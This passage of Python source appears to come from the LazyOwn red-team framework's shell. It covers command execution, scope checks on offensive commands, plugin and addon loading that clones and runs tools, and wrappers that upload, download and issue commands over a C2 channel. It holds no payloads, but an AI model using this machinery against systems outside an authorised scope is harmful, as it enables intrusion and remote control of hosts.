            data unchanged.
        """
        if self._ui_hints_level() != "on":
            return data
        try:
            engine = getattr(self, "_tips_engine", None)
            if engine is None:
                return data
            statement = getattr(data, "statement", "")
            cmd = str(getattr(statement, "command", "") or "").strip()
            if not cmd:
                cmd_str = str(statement or "")
                tokens = cmd_str.split()
                cmd = tokens[0] if tokens else ""
            if cmd not in self.get_all_commands():
                return data
            phase = self.params.get("phase") or ""
            engine.render(cmd=cmd, phase=phase)
        except Exception:
            pass
        return data

    def _run_auto_decrypt(self) -> None:
        """Decrypt session data automatically on authenticated startup."""
        crypto = getattr(self, "_auto_crypto", None)
        if crypto is None or not crypto.enabled:
            return
        try:
            decrypted = crypto.decrypt_session()
            if decrypted:
                print("Session data decrypted successfully.", flush=True)
        except Exception:
            pass

    def _run_auto_encrypt(self) -> None:
        """Encrypt session data automatically on application close."""
        crypto = getattr(self, "_auto_crypto", None)
        if crypto is None or not crypto.enabled:
            return
        try:
            encrypted = crypto.encrypt_session()
            if encrypted:
                print("Session data encrypted for at-rest protection.", flush=True)
        except Exception:
            pass

    def _read_recent_commands_for_autosuggest(self, limit: int = 5) -> list:
        """Return the last ``limit`` first-tokens from the session transcript.

        Args:
            limit: Maximum number of distinct command names to return.

        Returns:
            A list of command first-tokens. Empty when the file is absent.
        """
        try:
            sessions_dir = getattr(self, "sessions_dir", "sessions") or "sessions"
            path = os.path.join(sessions_dir, "LazyOwn_session_report.csv")
            if not os.path.isfile(path):
                return []
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                reader = csv.DictReader(fh)
                commands: list = []
                for row in reader:
                    for column in ("command", "tool", "name"):
                        value = (row.get(column) or "").strip().split()
                        if value:
                            commands.append(value[0])
                            break
                return commands[-limit:]
        except Exception:
            return []

    def _refresh_autosuggest(self, executed_command: str) -> None:
        """Recompute the active suggestion from the engine's provider chain.

        Args:
            executed_command: Raw string of the command that just ran.
        """
        engine = getattr(self, "_autosuggest", None)
        if engine is None:
            return
        enabled = str(self.params.get("enable_autosuggest", True)).lower() not in (
            "false",
            "0",
            "no",
        )
        engine.set_enabled(enabled)
        if not enabled:
            return
        context = _SuggestionContext(
            last_command=executed_command,
            phase=self.params.get("phase") or "",
            recent_commands=self._read_recent_commands_for_autosuggest(),
            target=self.params.get("rhost") or "",
            os_hint=str(self.params.get("os_id") or "unknown"),
        )
        engine.refresh(context)

    def _recording_hook(self, data: _PostcommandData) -> _PostcommandData:
        """Post-command hook: record commands when ``makerc`` is active."""
        try:
            if self._resource_recording:
                cmd_str = str(getattr(data, "statement", "") or "")
                if cmd_str.strip():
                    self._resource_recording_lines.append(cmd_str)
                    with open(self._resource_recording, "a") as f:
                        f.write(cmd_str + "\n")
        except Exception:
            pass
        return data

    def _did_you_mean(self, query, limit=3):
        """Return up to ``limit`` close-matching command names.

        Combines the local ``do_*`` index with the graphify knowledge graph
        (when available) so an unknown command is recovered by both lexical
        similarity and graph proximity. Empty result means no suggestion is
        confident enough to surface.
        """
        candidates = []
        seen = set()
        try:
            from cli.cli_enhancements import (
                FuzzyCommandIndex,
                StaticCommandLister,
                commands_from_cmd2_shell,
            )
            index = FuzzyCommandIndex(StaticCommandLister(commands_from_cmd2_shell(self)))
            for match in index.search(query, limit=limit * 2):
                name = (match.info.name or "").strip()
                if name and name not in seen:
                    seen.add(name)
                    candidates.append(name)
                if len(candidates) >= limit:
                    return candidates
        except Exception:
            pass
        try:
            advisor = _GraphAdvisor.from_path()
            if advisor.is_available():
                for hint in advisor.did_you_mean(query, limit=limit):
                    name = hint.strip().lstrip(".").rstrip("()")
                    if name and name not in seen:
                        seen.add(name)
                        candidates.append(name)
                    if len(candidates) >= limit:
                        break
        except Exception:
            pass
        return candidates[:limit]

    def logcsv(self, line, start_time=None, end_time=None, duration_ms=0):
        """Forward a command line to :meth:`log_command` for CSV persistence.

        Args:
            line: Full command line in ``"<verb> <args>"`` form.
            start_time: Optional pre-execution timestamp string forwarded
                verbatim to :meth:`log_command`.
            end_time: Optional post-execution timestamp string forwarded
                verbatim to :meth:`log_command`.
            duration_ms: Measured wall-clock duration in milliseconds.
        """
        command = line
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""
        self.log_command(
            cmd_name,
            cmd_args,
            start_time=start_time,
            end_time=end_time,
            duration_ms=duration_ms,
        )
        self.onecmd("rrhost")
        try:
            rhost = self.params.get("rhost", "")
            _get_event_bus().publish(_LazyEvent(
                category=_EventCategory.COMMAND,
                event_type=cmd_name,
                source="cli",
                payload={"command": command, "args": cmd_args, "duration_ms": duration_ms},
                target=rhost,
            ))
        except Exception:
            pass

    def cmd(self, line):
        """
        Internal function to execute commands.

        Executes the given shell command, captures stdout via ``tee`` so the
        operator both sees the output and a copy lands in ``sessions/logs/``,
        and forwards a telemetry record to
        :class:`modules.metrics.MetricsRecorder` so the duration and exit
        code can be analysed later.

        :param command: The command to be executed.
        :type command: str
        :return: ``None``.
        :rtype: NoneType
        """
        command = line
        path = os.getcwd()
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""
        domain = self.params["domain"]
        self.display_toastr(f"Executing... {command}")
        start_wall = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        start_monotonic = time.monotonic()
        if NOLOGS:
            exit_code = subprocess.call(command, shell=True)
        else:
            safe_cmd_name = os.path.basename(cmd_name)
            safe_domain = re.sub(r"[^A-Za-z0-9._-]", "_", domain) if domain else "unknown"
            path_command = (
                f"{path}/sessions/logs/command_{safe_cmd_name}output{safe_domain}.txt"
            )
            quoted_path = shlex.quote(path_command)
            exit_code = subprocess.call(
                f"{command} | tee {quoted_path}", shell=True
            )
            if os.path.exists(path_command):
                with open(path_command, "r") as file:
                    self.output = f"{cmd_name} {command} {file.read()}"
        duration_ms = int((time.monotonic() - start_monotonic) * 1000)
        end_wall = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logcsv(
            f"{cmd_name} {command}",
            start_time=start_wall,
            end_time=end_wall,
            duration_ms=duration_ms,
        )
        try:
            from modules.metrics import get_recorder as _get_recorder
            _get_recorder().record(
                command=cmd_name,
                args=cmd_args,
                duration_ms=duration_ms,
                success=(exit_code == 0),
                exit_code=exit_code,
                source="cli",
            )
        except Exception as exc:
            print_warn(f"metrics record failed: {exc}")
        try:
            rhost = self.params.get("rhost", "")
            _get_event_bus().publish(_LazyEvent(
                category=_EventCategory.COMMAND,
                event_type=cmd_name,
                source="cli",
                payload={
                    "command": command, "args": cmd_args,
                    "duration_ms": duration_ms, "exit_code": exit_code,
                    "output_snippet": self.output[:500] if self.output else "",
                },
                target=rhost,
                severity=_EventSeverity.INFO if exit_code == 0 else _EventSeverity.WARNING,
            ))
        except Exception:
            pass
        return

    def onecmd_plus_hooks(self, statement, add_to_history=True, raise_keyboard_interrupt=True, orig_rl_history_length=None):
        """Dispatch a command, expanding payload placeholders in custom aliases.

        This is the single chokepoint through which every interactive command
        flows, so it also enforces the authorization scope guard before the
        command runs. Accepts both raw strings and parsed cmd2 ``Statement``
        objects.

        Args:
            statement: The command to run, as a string or ``Statement``.
            add_to_history: Whether cmd2 should record the command in history.
            raise_keyboard_interrupt: Whether to propagate Ctrl-C.
            orig_rl_history_length: Readline bookkeeping passed through to cmd2.

        Returns:
            The ``stop`` flag from cmd2 (``True`` ends the loop). A scope block
            returns ``False`` so the offending command is skipped without
            terminating the session.
        """
        if isinstance(statement, str):
            raw_input = statement.strip()
            if not raw_input or raw_input.startswith('#'):
                return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
            cmd_name = raw_input.split()[0]
        else:
            cmd_name = statement.command
            raw_input = statement.raw

        if not self._scope_check(cmd_name):
            return False

        if cmd_name in self.aliases:
            raw_command = self.aliases[cmd_name]

            context = {
                **self.params,
                'version': self.version,
                'c2_url': getattr(self, 'c2_url', ''),
                'sessions_dir': getattr(self, 'sessions_dir', ''),
                'captured_images_dir': getattr(self, 'captured_images_dir', ''),
                'path': getattr(self, 'path', ''),
                'url_download': getattr(self, 'url_download', ''),
                'c2_user': self.params.get('c2_user', ''),
                'c2_pass': self.params.get('c2_pass', ''),
                'start_user': self.params.get('start_user', ''),
                'start_pass': self.params.get('start_pass', ''),
            }

            try:
                from cli.cli_enhancements import DictPayloadProvider, DynamicAliasResolver
                expanded_command = DynamicAliasResolver().expand(
                    cmd_name, raw_command, DictPayloadProvider(context),
                )
            except Exception as e:
                self.perror(f"[!] Error expanding alias '{cmd_name}': {e}")
                return True

            empty_keys = _empty_alias_placeholders(raw_command, context)
            blocking = [key for key in empty_keys if key in _REQUIRED_ALIAS_PLACEHOLDERS]
            if blocking:
                print_warn(
                    f"alias '{cmd_name}' requires {', '.join(blocking)} — "
                    f"set it first: assign {blocking[0]} <value>"
                )
                return False
            if empty_keys:
                print_warn(
                    f"alias '{cmd_name}': empty placeholder(s) {', '.join(empty_keys)} — "
                    f"command may misbehave; assign {empty_keys[0]} <value> to fix"
                )

            if isinstance(statement, str):
                return super().onecmd_plus_hooks(expanded_command, add_to_history=add_to_history,
                                            raise_keyboard_interrupt=raise_keyboard_interrupt)
            else:
                statement.raw = expanded_command
                statement.command = expanded_command.split()[0]
                statement.args = ' '.join(expanded_command.split()[1:])
                return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
                                            raise_keyboard_interrupt=raise_keyboard_interrupt)

        return super().onecmd_plus_hooks(statement, add_to_history=add_to_history,
                                    raise_keyboard_interrupt=raise_keyboard_interrupt)

    def _build_scope_offensive(self) -> frozenset:
        """Compute the set of offensive command names from cmd2 categories.

        Reads each command's help category via cmd2 introspection and delegates
        the offensive/benign decision to
        :func:`cli.scope_guard.build_offensive_commands`, so the classification
        policy lives in one tested place.

        Returns:
            The frozenset of offensive command names.
        """
        import cmd2

        categories: dict = {}
        for name in self.get_all_commands():
            func = getattr(self, f"do_{name}", None)
            categories[name] = getattr(
                func, cmd2.constants.CMD_ATTR_HELP_CATEGORY, None
            )
        return _build_offensive_commands(categories)

    def _resolve_offensive(self, name: str) -> bool:
        """Return whether a command (or custom alias) is offensive.

        Args:
            name: The command name or custom alias typed by the operator.

        Returns:
            ``True`` when the command, or the command a custom alias expands to,
            belongs to an offensive kill-chain category.
        """
        if name in self._scope_offensive:
            return True
        expansion = self.aliases.get(name)
        if expansion:
            tokens = expansion.split()
            if tokens and tokens[0] in self._scope_offensive:
                return True
        return False

    def _scope_check(self, cmd_name: str) -> bool:
        """Authorize a command against the configured engagement scope.

        Builds a fresh :class:`cli.scope_guard.ScopeGuard` from the live payload
        values so mid-session changes to ``scope`` / ``scope_enforcement`` take
        effect immediately, then renders the decision. The guard fails open: any
        unexpected error allows the command so a defect here never blocks the
        operator.

        Args:
            cmd_name: The command name about to run.

        Returns:
            ``True`` when the command may proceed, ``False`` when it must be
            skipped (enforce mode, out of scope, confirmation declined).
        """
        try:
            guard = _ScopeGuard(
                scope_entries=self.params.get("scope"),
                mode=self.params.get("scope_enforcement"),
                is_offensive=self._resolve_offensive,
            )
            target = str(self.params.get("rhost") or "").strip()
            decision = guard.evaluate(cmd_name, target)
            if not decision.reason:
                return True
            if decision.mode is _ScopeMode.WARN:
                print_warn(decision.reason)
                return True
            print_error(decision.reason)
            if self._scope_confirm(decision):
                return True
            print_warn("Command blocked: target is outside the authorized scope.")
            return False
        except Exception:
            return True

    def _scope_confirm(self, decision) -> bool:
        """Ask the operator to confirm an out-of-scope offensive command.

        Non-interactive sessions (piped input, ``-c`` execution, scripted runs)
        cannot answer a prompt, so they are treated as a refusal: the safer
        default for an enforce-mode block.

        Args:
            decision: The blocking :class:`cli.scope_guard.ScopeDecision`.

        Returns:
            ``True`` only when an interactive operator explicitly confirms.
        """
        if not sys.stdin.isatty():
            return False
        try:
            answer = input(
                "    [?] Run anyway against the out-of-scope target? [y/N]: "
            )
        except (EOFError, KeyboardInterrupt):
            return False
        return answer.strip().lower() in ("y", "yes")


    def one_cmd(self, command):
        """
        Internal function to execute commands.

        This method attempts to execute a given command using `onecmd` and captures
        the output. It sets the `output` attribute based on whether the command was
        executed successfully or an exception occurred.

        :param command: The command to be executed.
        :type command: str
        :return: A message indicating the result of the command execution.
        :rtype: str
        """
        self.output = ""
        try:
            original_stdout = sys.stdout
            sys.stdout = io.StringIO()
            self.onecmd(command)
            raw_output = sys.stdout.getvalue()
            sys.stdout = original_stdout

            self.output = raw_output

            if not self.use_ai or not self.ai_model:
                return raw_output

            clean_output = strip_ansi(raw_output)
            if not clean_output.strip():
                return "[Command executed. No output.]"

            prompt = (
                "You are a cybersecurity and red team expert. Analyse the following command output "
                "(everything is in the context of an authorised engagement within the scope defined by the client) "
                "and provide a concise summary with key findings, risks, and recommended next actions.\n\n"
                f"Command: {command}\n"
                f"Output:\n{clean_output}"
            )

            ai_response = self.ai_model.generate(prompt)
            return f"AI:\n{ai_response}\n\nOriginal output:\n{raw_output}"

        except Exception as e:
            error_msg = f"Error: {str(e)}"
            if self.use_ai and self.ai_model:
                return f"AI: Could not process command.\n{error_msg}"
            return error_msg

    def emptyline(self):
        """
        Handle the case where the user enters an empty line.

        This method is called when the user submits an empty line of input in
        the command-line interface. By default, it provides feedback indicating
        that no command was entered.

        It is useful for providing user-friendly messages or handling empty input
        cases in a custom manner.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is called by the cmd library when an empty line is
        entered. You can override it in a subclass to change its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.emptyline()
            You didn't enter any command.
        """
        print_warn("You didn't enter any command.")

    def load_user_commands(self):
        """Carga los comandos personalizados desde user_commands.json"""
        filepath = "user_commands.json"
        if not os.path.exists(filepath):
            return []
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except Exception as e:
            print_error(f"Error loading user commands: {e}")
            return []

    def save_user_command(self, alias, command):
        """Guarda un nuevo comando en user_commands.json"""
        filepath = "user_commands.json"
        commands = self.load_user_commands()
        commands.append([alias, command])  # Guardamos como [alias, command] para compatibilidad
        try:
            with open(filepath, 'w') as f:
                json.dump(commands, f, indent=4)
            print_msg(f"✅ Command '{alias}' saved successfully!")
        except Exception as e:
            print_error(f"Error saving command: {e}")

    def list_files_in_directory(self, directory):
        """Lista todos los archivos en un directorio dado."""
        if not os.path.exists(directory):
            return []
        return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

    def register_tool_commands(self):
        """Register every active ``tools/*.tool`` as a ``do_<toolname>`` command.

        Placeholders in the tool's ``command`` template are resolved at call
        time against ``self.params`` (so live config changes are honored).
        Optional positional args passed to the command override ``port`` and
        are appended as extra flags. When ``sessions/scan_<rhost>.nmap.xml``
        exists and the tool's triggers match a discovered service, the host
        and port are pre-populated from the scan; otherwise the command falls
        back to ``rhost``/``rport`` from ``payload.json``.

        Returns:
            None
        """
        tool_dir = "tools"

        if not os.path.exists(tool_dir):
            print_error(f"[!] Folder '{tool_dir}' not found.")
            return

        for tool_file in glob.glob(os.path.join(tool_dir, "*.tool")):
            try:
                with open(tool_file, 'r') as f:
                    tool_data = json.load(f)

                tool_name = tool_data.get("toolname")
                command_template = tool_data.get("command")
                triggers = tool_data.get("trigger", []) or []
                active = tool_data.get("active", False)
                tool_category = tool_data.get("category", pwntomate_category)
                tool_description = tool_data.get("description", "")

                if not active or not tool_name or not command_template:
                    continue

                safe_tool_name = re.sub(r'[^A-Za-z0-9_]', '_', str(tool_name))

                matched_target = None
                current_rhost = rhost or ""
                xmmll = f"sessions/scan_{current_rhost}.nmap.xml" if current_rhost else ""
                if xmmll and os.path.exists(xmmll):
                    try:
                        report = NmapParser.parse_fromfile(xmmll)
                        for host in report.hosts:
                            for service in host.services:
                                if service.service in triggers or "all" in triggers:
                                    matched_target = {
                                        "ip": host.address,
                                        "port": str(service.port),
                                        "service": service.service,
                                        "proto": service.protocol,
                                        "tunnel": "s" if service.tunnel == "ssl" else "",
                                    }
                                    break
                            if matched_target:
                                break
                    except Exception as exc:
                        print_warn(f"could not parse {xmmll}: {exc}")

                def make_wrapper(cmd_template, tname, default_target):
                    def tool_wrapper(arg):
                        extra = str(arg).strip() if arg is not None else ""
                        port_override = ""
                        extra_flags = ""
                        if extra:
                            parts = extra.split(None, 1)
                            if parts and parts[0].isdigit():
                                port_override = parts[0]
                                extra_flags = parts[1] if len(parts) > 1 else ""
                            else:
                                extra_flags = extra

                        params = self.params
                        target_ip = params.get("rhost") or rhost or ""
                        target_port = port_override or (default_target or {}).get("port") or str(params.get("rport") or "")
                        target_service = (default_target or {}).get("service") or ""
                        target_proto = (default_target or {}).get("proto") or "tcp"
                        target_tunnel = (default_target or {}).get("tunnel")
                        if target_tunnel is None:
                            target_tunnel = "s" if target_port in ("443", "8443") else ""

                        outputdir = os.path.join("sessions", target_ip or "unknown", tname)
                        try:
                            os.makedirs(outputdir, exist_ok=True)
                        except OSError as exc:
                            print_warn(f"could not create {outputdir}: {exc}")

                        cmd_params = {
                            "ip": target_ip,
                            "port": target_port,
                            "domain": params.get("domain", "") or "",
                            "dnswordlist": params.get("dnswordlist", "") or "",
                            "dirworlist": params.get("dirwordlist", "") or "",
                            "usrwordlist": params.get("usrwordlist", "") or "",
                            "nameserver": params.get("nameserver", "") or target_ip,
                            "service": target_service,
                            "proto": target_proto,
                            "username": params.get("start_user", "") or "",
                            "password": params.get("start_pass", "") or "",
                            "outputdir": outputdir,
                            "toolname": tname,
                            "s": target_tunnel,
                            "tunnel": target_tunnel,
                            "ext": params.get("ext", "") or "",
                        }

                        final_command = replace_command_placeholders(cmd_template, cmd_params)
                        if extra_flags:
                            final_command = f"{final_command} {extra_flags}"
                        self.cmd(final_command)

                    return tool_wrapper

                wrapper = make_wrapper(command_template, tool_name, matched_target)

                trigger_label = ", ".join(triggers) if triggers else "(any)"
                preview_params = {
                    "ip": current_rhost or "<rhost>",
                    "port": (matched_target or {}).get("port", "<port>"),
                    "domain": domain or "<domain>",
                    "dnswordlist": dnswordlist or "<dnswordlist>",
                    "dirworlist": "<dirwordlist>",
                    "usrwordlist": "<usrwordlist>",
                    "nameserver": current_rhost or "<nameserver>",
                    "service": (matched_target or {}).get("service", ""),
                    "proto": (matched_target or {}).get("proto", "tcp"),
                    "username": start_user or "<username>",
                    "password": start_pass or "<password>",
                    "outputdir": os.path.join("sessions", current_rhost or "<rhost>", safe_tool_name),
                    "toolname": tool_name,
                    "s": (matched_target or {}).get("tunnel", ""),
                    "tunnel": (matched_target or {}).get("tunnel", ""),
                    "ext": "",
                }
                preview_cmd = replace_command_placeholders(command_template, preview_params)

                docstring = (f"{tool_description}\n\n" if tool_description else "")
                docstring += f"Tool:      {tool_name}\n"
                docstring += f"Category:  {tool_category}\n"
                docstring += f"Trigger:   {trigger_label}\n"
                docstring += f"Usage:     {safe_tool_name} [port] [extra-flags]\n"
                docstring += f"Example:   {preview_cmd[:160]}\n"
                if matched_target:
                    docstring += (
                        f"Matched:   {matched_target['service']} "
                        f"({matched_target['proto']}/{matched_target['port']}) on {current_rhost}\n"
                    )
                wrapper.__doc__ = docstring
                cmd2.utils.categorize(wrapper, tool_category)
                setattr(self, f"do_{safe_tool_name}", wrapper)
                print_msg(f"Command '{safe_tool_name}' registered [{tool_category}] from tools")

            except Exception as e:
                print_error(f"[ERROR] Failed to load tool {tool_file}: {e}")

    def _register_lua_command(self, command_name, lua_function):
        """Registra un comando nuevo desde Lua."""
        @cmd2.with_category("13. Lua Plugin")
        def wrapper(arg):
            try:
                result = lua_function(arg)
                if result is not None:
                    print(result)
            except Exception as e:
                self.display_toastr(f"Error en el comando Lua {command_name}: {e}", type="error")
        yaml_file = os.path.join(self.plugins_dir, f"{command_name}.yaml")
        description = ""

        if os.path.exists(yaml_file):
            try:
                with open(yaml_file, 'r') as file:
                    yaml_data = yaml.safe_load(file)
                    description = yaml_data.get('description', "")
            except Exception as e:
                self.display_toastr(f"Error reading YAML  {command_name}: {e}", type="error")

        wrapper.__doc__ = description if description else f"Execute the Lua command '{command_name}'."
        setattr(self, f'do_{command_name}', wrapper)
        print_msg(f"Command '{command_name}' register from Lua.")

    def load_plugins(self):
        """Load every Lua plugin from the 'plugins/' directory."""
        plugins_dir = self.plugins_dir
        if not os.path.exists(plugins_dir):
            os.makedirs(plugins_dir)
            print_msg("Plugin directory created.")
            return

        for filename in os.listdir(plugins_dir):
            if filename.endswith('.lua'):
                filepath = os.path.join(plugins_dir, filename)
                yaml_ = filename.replace(".lua", ".yaml")
                filepathyaml = os.path.join(plugins_dir, yaml_)
                if filepathyaml == 'plugins/init_plugins.yaml':
                    pass
                else:
                    try:
                        with open(filepathyaml, 'r') as file:
                            file_yaml = yaml.safe_load(file)
                            enabled = file_yaml.get('enabled')
                            if enabled:
                                try:
                                    with open(filepath, 'r') as file:
                                        script = file.read()
                                        self.lua.execute(script)
                                except Exception as e:
                                    print_error(f"Error al cargar el plugin '{filename}': {e}")
                    except Exception as e:
                        print_error(f"Error al cargar el yaml '{filepathyaml}': {e}")

    def load_yaml_plugins(self):
        """
        Loads all YAML plugins from the 'lazyaddons/' directory.

        This method scans the 'lazyaddons/' directory, reads each YAML file,
        and registers enabled plugins as new commands.
        """
        if not os.path.exists(self.lazyaddons_dir):
            os.makedirs(self.lazyaddons_dir)
            print_warn("Lazyaddons directory created.")
            return

        for filename in os.listdir(self.lazyaddons_dir):
            if filename.endswith('.yaml'):
                filepath = os.path.join(self.lazyaddons_dir, filename)
                try:
                    with open(filepath, 'r') as file:
                        plugin_data = yaml.safe_load(file)
                        if plugin_data.get('enabled', False):
                            self.register_yaml_plugin(plugin_data)
                except Exception as e:
                    print_error(f"Error loading YAML plugin '{filename}': {e}")

    def register_yaml_plugin(self, plugin_data):
        """Register a YAML addon as a shell command.

        Reads the optional ``category`` field from the addon YAML (falls back
        to ``"14. Yaml Addon."`` when absent) and sets the cmd2 category
        attribute on the wrapper so the command appears in the correct palette
        section without any hardcoded string in this method.

        Also reads the optional ``tags`` list for future palette filtering,
        the optional ``os`` field (MITRE platform: ``linux``, ``windows``,
        ``macos``, ``network``, ``containers``, ``saas``, ``iaas`` or
        ``any``) and the optional ``trigger`` list of nmap service names
        consumed by the exploration engine. Both ``os`` and ``trigger``
        default to ``any`` / ``[]`` so legacy addons keep loading.

        A lightweight dependency check runs before first execution.
        """
        from cli.exploration import (
            ALLOWED_OS_VALUES,
            ANY_OS,
            normalise_os,
            normalise_trigger,
        )

        tool = plugin_data.get('tool', {})
        name = plugin_data['name']
        params = plugin_data.get('params', [])
        description = plugin_data.get('description', '')
        tags = plugin_data.get('tags', [])
        execute_command = tool.get('execute_command', '')
        addon_category = plugin_data.get('category', '14. Yaml Addon.')
        addon_os = normalise_os(plugin_data.get('os'), default=ANY_OS)
        addon_trigger = normalise_trigger(plugin_data.get('trigger'))
        raw_os = plugin_data.get('os')
        if isinstance(raw_os, str) and raw_os.strip().lower() not in ALLOWED_OS_VALUES:
            print_warn(
                f"Addon '{name}' declares unknown os='{raw_os}' "
                f"(allowed: {sorted(ALLOWED_OS_VALUES)}); falling back to '{ANY_OS}'."
            )

        def wrapper_yaml(arg):
            try:
                args = arg.split()
                param_values = {}

                for param in params:
                    param_name = param['name']
                    if param.get('required', False) and param_name not in self.params:
                        self.display_toastr(f"Error: Parameter '{param_name}' is required but not found in self.params.", type='warning')
                        return
                    if param_name in self.params:
                        param_values[param_name] = self.params[param_name]
                    elif 'default' in param:
                        param_values[param_name] = param['default']
                    else:
                        self.display_toastr(f"Error: Parameter '{param_name}' is missing and no default value is provided.", type='warning')
                        return
                try:
                    install_path = os.path.join(os.getcwd(), tool['install_path'])
                    if not os.path.exists(install_path):
                        self.display_toastr(f"{tool['name']} is not installed. Installing...", type='warning')
                        self.cmd(f"git clone {tool['repo_url']} {install_path}")
                        if 'install_command' in tool:
                            cmdinstall = replace_command_placeholders(tool['install_command'], self.params)
                            self.cmd(f"cd {install_path} && {cmdinstall}")
                            self.cmd("sleep 2")

                    if 'execute_command' in tool:
                        binary = execute_command.split()[0] if execute_command else ''
                        if binary and not os.path.isabs(binary) and not is_binary_present(binary):
                            install_hint = tool.get('install_command', f"git clone {tool.get('repo_url','')}")
                            print_warn(f"'{binary}' not found in PATH.")
                            print_warn(f"Install: {install_hint[:120]}")
                        command_replaced = replace_command_placeholders(execute_command, self.params)
                        if args:
                            final_command = f"cd {install_path} && {command_replaced} {' '.join(args)}"
                        else:
                            final_command = f"cd {install_path} && {command_replaced}"
                        self.cmd(final_command)

                    if 'upload_file' in tool:
                        for file_path in [f.strip() for f in tool['upload_file'].split(',')]:
                            if file_path:
                                self.display_toastr(f"Remote Upload executing: upload_c2 {file_path}", type='info')
                                self.onecmd(f"upload_c2 {file_path}")
                                self.cmd("sleep 10")

                    if 'remote_command' in tool:
                        remotecmd = replace_command_placeholders(tool['remote_command'], self.params)
                        self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
                        self.onecmd(f"issue_command_to_c2 {remotecmd}")

                    if 'download_file' in tool:
                        for file_path in [f.strip() for f in tool['download_file'].split(',')]:
                            if file_path:
                                self.display_toastr(f"Remote Download executing: download_c2 {file_path}", type='info')
                                self.onecmd(f"download_c2 {file_path}")

                    if 'lazycommand' in tool:
                        lazycommand = replace_command_placeholders(tool['lazycommand'], self.params)
                        self.display_toastr(f"Lazy Command executing: {lazycommand}", type='info')
                        for lazy_cmd in [c.strip() for c in lazycommand.split(',')]:
                            if lazy_cmd:
                                self.onecmd(lazy_cmd)

                except KeyError as e:
                    self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
                    return

            except Exception as e:
                self.display_toastr(f"Error in plugin '{name}': {e}", type='error')
                return

        trigger_label = ", ".join(addon_trigger) if addon_trigger else "(none)"
        wrapper_yaml.__doc__ = (
            f"{description}\n\nCategory: {addon_category}"
            f"\nOS: {addon_os}"
            f"\nTrigger: {trigger_label}"
            + (f"\nTags: {', '.join(tags)}" if tags else "")
        )
        cmd2.utils.categorize(wrapper_yaml, addon_category)
        setattr(self, f'do_{name}', wrapper_yaml)
        print_msg(f"Command '{name}' registered [{addon_category}] from YAML.")

    def register_all_adversary_commands(self):
        for file in glob.glob("lazyadversaries/*.yaml"):
            with open(file, 'r') as f:
                try:
                    data = yaml.safe_load(f)
                    if isinstance(data, dict):
                        self._register_adversary_command(data)
                    elif isinstance(data, list):
                        for adversary in data:
                            self._register_adversary_command(adversary)
                except Exception as e:
                    print_error(f"Error parsing {file}: {e}")

    def _register_adversary_command(self, adv):
        if not all(k in adv for k in REQUIRED_KEYS):
            print_warn(f"Skipping invalid adversary entry (missing required fields): {adv.get('name', '<unnamed>')}")
            return

        name = adv['name'].replace('.', '_')
        description = adv['description']

        @cmd2.with_category("14. Adversary Emulation")
        def cmd_wrapper(_):
            return self.do_adversary_yaml(str(adv['id']) + ' l')

        cmd_wrapper.__doc__ = description
        setattr(self, f'do_{name}', cmd_wrapper)
        print_msg(f"Command '{name}' registered for adversary ID {adv['id']}")

    def display_toastr(self, message, type="info"):
        """Display a toastr-like notification in the terminal with adaptive sizing."""

        styles = {
            "success": {"border_style": "green", "text_style": "bold green"},
            "error": {"border_style": "red", "text_style": "bold red"},
            "warning": {"border_style": "yellow", "text_style": "bold yellow"},
            "info": {"border_style": "blue", "text_style": "bold blue"}
        }
        style = styles.get(type.lower(), styles["info"])
        terminal_size = self.console.size
        terminal_width = terminal_size.width
        clean_message = message.strip()
        if not clean_message:
            clean_message = "Empty message"

        if self._ui_hints_level() == "off":
            self.console.print(f"[{type.upper()}] {clean_message}", style=style["text_style"])
            return

        lines = clean_message.split('\n')
        max_line_length = max(len(line) for line in lines)
        min_width = max(20, len(type.upper()) + 8)
        max_width = min(100, int(terminal_width * 0.9))
        content_based_width = max_line_length + 8
        optimal_width = max(min_width, min(content_based_width, max_width))

        if max_line_length > optimal_width - 8:
            import textwrap
            wrapped_lines = []
            for line in lines:
                if len(line) <= optimal_width - 8:
                    wrapped_lines.append(line)
                else:
                    wrapped = textwrap.fill(line, width=optimal_width - 8, break_long_words=False, break_on_hyphens=False)
                    wrapped_lines.extend(wrapped.split('\n'))

            final_message = '\n'.join(wrapped_lines)
            num_lines = len(wrapped_lines)
        else:
            final_message = clean_message
            num_lines = len(lines)

        num_lines + 2

        panel = Panel(
            Text(final_message, style=style["text_style"], justify="left"),
            border_style=style["border_style"],
            width=optimal_width,
            padding=(0, 2),
            title=f"[bold]{type.upper()}[/bold]",
            title_align="center"
        )

        def show_toastr():
            self.console.print(panel, justify="center")

        show_toastr()

    def _wrap_text(self, text, max_width):
        """Helper method to wrap text to fit within specified width."""
        import textwrap

        lines = text.split('\n')
        wrapped_lines = []

        for line in lines:
            if len(line) <= max_width:
                wrapped_lines.append(line)
            else:
                wrapped = textwrap.fill(line, width=max_width, break_long_words=True)
                wrapped_lines.extend(wrapped.split('\n'))

        return '\n'.join(wrapped_lines)

    @cmd2.with_category(miscellaneous_category)

    def completedefault(self, text, line, begidx, endidx):
        """Fall through to the payload-aware completer for unhandled commands."""
        try:
            from cli.cli_enhancements import DictPayloadProvider, PayloadAwareCompleter
        except ImportError:
            return []
        try:
            tokens = line[:endidx].split()
            cmd = tokens[0] if tokens else ""
            partial = text or ""
            payload = DictPayloadProvider(getattr(self, "params", {}) or {})
            completer = PayloadAwareCompleter(
                payload,
                addon_lister=lambda: [
                    p.stem for p in __import__("pathlib").Path(
                        getattr(self, "lazyaddons_dir", "lazyaddons")
                    ).glob("*.yaml")
                ],
                plugin_lister=lambda: [
                    p.stem for p in __import__("pathlib").Path(
                        getattr(self, "plugins_dir", "plugins")
